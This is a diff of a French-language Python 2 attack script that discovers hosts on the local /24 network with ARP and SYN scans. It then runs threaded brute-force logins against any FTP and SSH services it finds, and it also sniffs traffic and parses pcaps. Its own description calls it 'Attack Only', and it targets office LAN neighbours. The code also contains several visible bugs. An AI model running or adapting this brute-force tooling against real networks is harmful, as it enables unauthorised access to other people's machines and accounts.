@@ -5,88 +5,105 @@ __author__='''
 [Cs133]
 Twitter: @133_cesium
 
+***
+The aim of this is to discover who is online in the neightborhood of the same LAN (at the office for example...)
+And if some known ports are open and in listenning mode, we try to access them the hard way. :)
+That simple.
+
+Steps:
+------
+1st: ARP check on LAN/24
+2nd: Discovering sequence (Hostname for example, if shared) and port scan
+3rd: Attacking attempts by BF
+***
+
 <+> Under the terms of the GPL v3 License.
 '''
 
-import paramiko
 import logging
-import math
+from math import log
 import errno
 import socket
-import sys,os
-import ftplib
-import argparse
-import threading
-import subprocess
+import sys
 import scapy.route
 import scapy.config
+from ftplib import FTP
 import scapy.layers.l2
 from scapy.all import *
 from time import strftime
 from random import randint
+from threading import Thread
 from datetime import datetime
-from multiprocessing import Pool
+from argparse import ArgumentParser
 from string import digits,ascii_lowercase
+from paramiko import SSHClient, AutoAddPolicy
 
-known_ports = [21,22,25,80,443]
-big = ascii_lowercase + digits
-online = {}
-ips_o,pwd = [],[]
-start_clock = datetime.now()
-SYNACK = 0x12
-RSTACK = 0x14
-flag = 0
-ftop = 0
+known_ports 	= [21,22,25,80,443]
+big 		= ascii_lowercase + digits
+online  	= {}
+ips_o,pwd	= [],[]
+SYNACK  	= 0x12
+RSTACK  	= 0x14
+flag,ftop	= 0,0
 
 logging.basicConfig(format='%(asctime)s %(levelname)-5s %(message)s', datefmt='%Y-%m-%d %H:%M:%S', level=logging.DEBUG)
 logger = logging.getLogger(__name__)
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 
 
+def factorisation(length):
+	if length == 1: return length
+	return factorisation(length-1)*length
+
 def pwd_lower(lgr):
 	return ''.join(ascii_lowercase[randint(0,len(ascii_lowercase)-1)] for i in range(int(lgr)))
-
 
 def pwd_dig(lgr):
 	return ''.join(digits[randint(0,len(digits)-1)] for i in range(int(lgr)))
 
-
 def pwd_big(lgr):
 	return ''.join(big[randint(0,len(big)-1)] for i in range(int(lgr)))
 
-
 def generate(mode,lgr):
+	stop = False
+	if mode == 'alpha':
+		len_mode = factorisation(ascii_lowercase)
+	elif mode == 'digits':
+		len_mode = factorisation(digits)
+	else:
+		len_mode = factorisation(big)
 	try:
-		while len(pwd) != 100000:
-			if mode == 'alpha': 	psswd = pwd_lower(lgr)
+		sys.stdout.write('\n\033[94m[+]\033[0m Création aléatoire du Dictionnaire en cours...')
+		while stop != True:
+			if mode == 'alpha':	psswd = pwd_lower(lgr)
 			elif mode == 'digits':	psswd = pwd_dig(lgr)
 			else:			psswd = pwd_big(lgr)
 			if psswd not in pwd:	pwd.append(psswd)
-			if len(pwd) == 100000: sys.stdout.write('\n\033[94m[+]\033[0m Dictionnaire généré.\n')
+			if len(pwd) == len_mode:
+				stop = True
+				sys.stdout.write('\n\033[94m[+]\033[0m Dictionnaire généré.\n')
 	except KeyboardInterrupt:
 		sys.stdout.write('\n\033[94m[+]\033[0m Génération interrompue avec succès. Longueur : %d.\n' % len(pwd))
-		pass
+		return pwd
 	return pwd
-
 
 def detonate(log,addr,psswd):
 	global ftop
-	prout = ftplib.FTP(addr)
+	trig = FTP(addr)
 	try:
-		ret = prout.login(user=log,passwd=psswd)
-		prout.quit()
+		ret = trig.login(user=log,passwd=psswd)
+		trig.quit()
 		if "successful" in ret:
 			ftop = 1
 			sys.stdout.write('\n\n\n\033[94m[+]\033[0m FTP YEAH : ' + addr + ' --> ' + psswd + '\n\n')
 	except:
-		prout.close()
-
+		trig.close()
 
 def ssh_conn(log,addr,passwd):
 	global flag
 	try:
-		client = paramiko.SSHClient()
-		client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+		client = SSHClient()
+		client.set_missing_host_key_policy(AutoAddPolicy())
 		client.connect(addr,
 			username=log,
 			password=psswd,
@@ -97,12 +114,10 @@ def ssh_conn(log,addr,passwd):
 	except:
 		pass
 
-
 def long2net(arg):
 	if (arg <= 0 or arg >= 0xFFFFFFFF):
 		raise ValueError("Valeur du masque illégale.", hex(arg))
-	return 32 - int(round(math.log(0xFFFFFFFF - arg, 2)))
-
+	return 32 - int(round(log(0xFFFFFFFF - arg, 2)))
 
 def to_CIDR_notation(bytes_network, bytes_netmask):
 	network = scapy.utils.ltoa(bytes_network)
@@ -111,9 +126,7 @@ def to_CIDR_notation(bytes_network, bytes_netmask):
 	if netmask < 16:
 		logger.warn("%s est trop gros." % net)
 		return None
-
 	return net
-
 
 def scan_and_print_neighbors(net, interface, timeout=1):
 	global ips_o
@@ -138,7 +151,6 @@ def scan_and_print_neighbors(net, interface, timeout=1):
 		else:
 			raise
 
-
 def local_network_scan():
 	for network, netmask, _, interface, address in scapy.config.conf.route.routes:
 		if network == 0 or interface == 'lo' or address == '127.0.0.1' or address == '0.0.0.0':
@@ -151,7 +163,6 @@ def local_network_scan():
 			continue
 		if net:
 			scan_and_print_neighbors(net, interface)
-
 
 def checkhost(ip):
 	global ips_o
@@ -169,45 +180,37 @@ def checkhost(ip):
 	except Exception:
 		pass
 
-
 def network_scan(ip):
 	mask = [255,255,255,0]
 	ipf = ip.split('.')
 	pre = [str(int(ipf[i]) & mask[i]) for i in range(len(ipf))]
 	ip_reseau = pre[0] + '.' + pre[1] + '.' + pre [2] + '.'
 	relicat = 255 - int(pre[3])
-	if relicat != 255:
-		all_hosts = relicat
-	else:
-		all_hosts = 255
-
+	all_host = relicat if relicat != 255 else 255
 	return [ip_reseau + str(suffixe) for suffixe in range(int(pre[3]),all_hosts,1)]
-
 
 def scanner(target):
 	global online
 	ports_i = []
 	for port in known_ports:
 		try:
-        	        srcport = randint(20000,40000)
-        	        conf.verb = 0
-        	        SYNACKpkt = sr1(IP(dst = target)/TCP(sport = srcport, dport = port, flags = "S"), timeout=2)
-        	        pktflags = SYNACKpkt.getlayer(TCP).flags
-
-        	        if pktflags == SYNACK:
+			srcport = randint(20000,40000)
+        		conf.verb = 0
+        		SYNACKpkt = sr1(IP(dst = target)/TCP(sport = srcport, dport = port, flags = "S"), timeout=2)
+        		pktflags = SYNACKpkt.getlayer(TCP).flags
+        		if pktflags == SYNACK:
 				print '[+] Port Ouvert :', port, 'sur la cible --> ', target
 				ports_i.append(port)
-        	        else:
-	        	        RSTpkt = IP(dst = target)/TCP(sport = srcport, dport = port, flags = "R")
-	        	        send(RSTpkt)
-        	except KeyboardInterrupt:
-        	        RSTpkt = IP(dst = target)/TCP(sport = srcport, dport = port, flags = "R")
-        	        send(RSTpkt)
-        	        print "\n[*] La requete de l'utilisateur s'est stoppée..."
+	 		else:
+	        		RSTpkt = IP(dst = target)/TCP(sport = srcport, dport = port, flags = "R")
+				send(RSTpkt)
+		except KeyboardInterrupt:
+			RSTpkt = IP(dst = target)/TCP(sport = srcport, dport = port, flags = "R")
+			send(RSTpkt)
+			print "\n[*] La requete de l'utilisateur s'est stoppée..."
 		except Exception as e:
 			print e
 	online[target] = ports_i
-
 
 def port_scan(ip):
 	global ips_o, online
@@ -220,21 +223,17 @@ def port_scan(ip):
 	else:
 		all_hosts = network_scan(ip)
 		for host in all_hosts:
-			proc = threading.Thread(target=checkhost,args=(host,))
+			proc = Thread(target=checkhost,args=(host,))
 			proc.start()
-
 	print ips_o
-
 	if ips_o:
 		for ip in ips_o:
-			proc = threading.Thread(target=scanner,args=(ip,))
+			proc = Thread(target=scanner,args=(ip,))
 			proc.start()
 			proc.join()
 	else:
 		sys.exit('\033[91m[-]\033[0m Aucune IP trouvée sur le réseau.\n')
-
 	print '\033[94m[+]\033[0m Résumé du scan de ports:\n', online
-
 
 def get_ip():
 	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -249,11 +248,9 @@ def get_http_headers(http_payload):
         	headers = dict(re.findall(r'(?P<name>.*?):(?P<value>.*?)\r\n', headers_raw))
     	except:
         	return None
-
 	if 'Content-Type' not in headers:
         	return None
     	return headers
-
 
 def pcap(pc):
     	try:
@@ -261,12 +258,10 @@ def pcap(pc):
         	p = pcap.sessions()
     	except IOError:
         	sys.exit(red + "[-] " + nat + "IOError.")
-
     	for session in p:
         	idx, flag = 0, 0
         	concat = ''
         	print blu, '\n[ Nouvelle Session = %s ]' % p[session], nat
-
         	for pkt in p[session]:
         		if pkt.haslayer(TCP) and pkt.haslayer(Raw) and (pkt[TCP].flags == 24L or pkt[TCP].flags == 16):
                 		print red, '\nPacket %d -------------- Nouveau Payload -------------\n\n' % idx, nat
@@ -275,7 +270,6 @@ def pcap(pc):
                 		headers = get_http_headers(load)
                 		if headers is not None and ' gzip' in headers.values():
                 			print load[:15]
-
                     			for k,v in headers.iteritems():
                         			print k,':',v
                     			tab = load.split('\r\n')
@@ -284,7 +278,6 @@ def pcap(pc):
                 		elif flag != 0 and headers is None:
                     			tab = load.split('\r\n')
                     			concat += tab[-1]
-
                     			try:
                         			sio = StringIO.StringIO(concat)
                         			gz = gzip.GzipFile(fileobj=sio)
@@ -297,13 +290,12 @@ def pcap(pc):
 		                	print payload
 			idx += 1
 
-
 def get_args():
-	args = argparse.ArgumentParser(version='1.0',description='Attack Only, made by Cesium133.')
+	args = ArgumentParser(version='1.0',description='Attack Only, made by Cesium133.')
 	args.add_argument('-b','--bruteforce',
 		action='store_true',
 		default=False,
-		help='.')
+		help='Argument optionnel pour déclencher le mode attaque.')
 	args.add_argument('-i','--ip',
 		action='store',
 		nargs=1,
@@ -330,21 +322,21 @@ def get_args():
 		action='store',
 		nargs=1,
 		help='Analyse un pcap pour déceler les requetes HTTP.')
-
 	return args.parse_args()
 
 
+# Entry point
 if __name__ == '__main__':
-
 	args = get_args()
-#	pool = Pool(4)
 	user = args.username[0]
 	print '\033[94m[+]\033[0m User:', user
 	if args.ip is None:	ip = get_ip()
 	else: 			ip = args.ip[0]
 	print '\033[94m[+]\033[0m IP:', ip
 
+#	from multiprocessing import Pool
 #	with open(args.wordlist[0],'r') as dico:
+#		pool = Pool(4)
 #		pool.map(detonate,dico,4)
 
 	if args.pcap is not None:
@@ -352,7 +344,8 @@ if __name__ == '__main__':
 		sys.exit(0)
 
 	ips = network_scan(ip)
-
+	port_scan(ip)
+	
 	if args.wordlist is not None:
 		try:
 			print "\033[94m[+]\033[0m Prise en compte de la wordlist:", args.wordlist[0]
@@ -368,10 +361,9 @@ if __name__ == '__main__':
 		print "[*] Pour interrompre le processus et poursuivre les tests -> [CTRL+C]"
 		dic = generate(args.mode[0], args.longueur[0])
 	else:
-		print '\033[91m[-]\033[0m Vous devez mentionner un mode (wordlist / mode de bf).'
-		sys.exit(1)
+		online = []
+		print '[-] Online est vidé.'
 
-	port_scan(ip)
 	if not online:
 		sys.exit('[-] Online est vide après le scan de port.\n')
 
@@ -383,9 +375,8 @@ if __name__ == '__main__':
 					print "\033[94m[+]\033[0m Cible avec FTP ouvert : %s." % host
 					try:
 						for item in dic:
-							t = threading.Thread(target=detonate,args=(user,ip,item,))
+							t = Thread(target=detonate,args=(user,ip,item,))
 							t.start()
-							#t.join()
 							idx += 1
 							if ftop == 1:
 								ftop = 0
@@ -401,9 +392,8 @@ if __name__ == '__main__':
 					print "\033[94m[+]\033[0m Cible avec SSH ouvert : %s." % host
 					try:
 						for psswd in dic:
-							conn = threading.Thread(target=ssh_conn,args=(user,addr,psswd,))
+							conn = Thread(target=ssh_conn,args=(user,addr,psswd,))
 							conn.start()
-							#conn.join()
 							idx += 1
 							if flag == 1: break
 						if flag == 1:
@@ -421,4 +411,5 @@ if __name__ == '__main__':
 					except KeyboardInterrupt:
 						wrpcap('filtered.pcap', sniffed, append=True)
 	else:
-		print '[-] Online est vide.'
+		print '\033[91m[-]\033[0m Afin de poursuivre l\'analyse, vous devez mentionner un mode (wordlist / mode de bf).'
+		sys.exit(1)
